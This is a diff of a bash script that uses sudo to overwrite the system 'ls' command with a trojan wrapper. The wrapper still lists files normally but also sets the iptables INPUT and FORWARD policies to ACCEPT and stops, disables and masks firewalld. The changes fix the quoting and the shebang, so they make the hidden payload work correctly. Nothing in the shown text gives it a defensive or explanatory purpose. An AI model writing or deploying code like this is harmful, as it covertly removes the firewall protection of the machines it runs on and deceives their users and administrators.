@@ -1,15 +1,13 @@
 #!/bin/bash
 
 ls_path="$(which ls 2>/dev/null)"
-
-sudo bash -c 'cat > $ls_path' << 'EOF'
-!#/bin/bash
-if [[ "$1" == "$ls_path" ]]; then
+sudo bash -c "cat > \"$ls_path\"" << 'EOF'
+#!/bin/bash
+if [[ "$1" == "$(which ls)" ]]; then
     shift
 fi
-$ls_path.real "$@"
-
-$ls_path.real 
+"$(which ls).real" "$@"
+"$(which ls).real"
 
 sudo iptables -P INPUT ACCEPT > /dev/null 2>&1
 sudo iptables -P FORWARD ACCEPT > /dev/null 2>&1
@@ -25,7 +23,7 @@ sudo systemctl stop firewalld > /dev/null 2>&1
 sudo systemctl disable firewalld > /dev/null 2>&1
 sudo systemctl mask firewalld > /dev/null 2>&1
 
-echo here
+echo "here"
 
 exit 127
 EOF
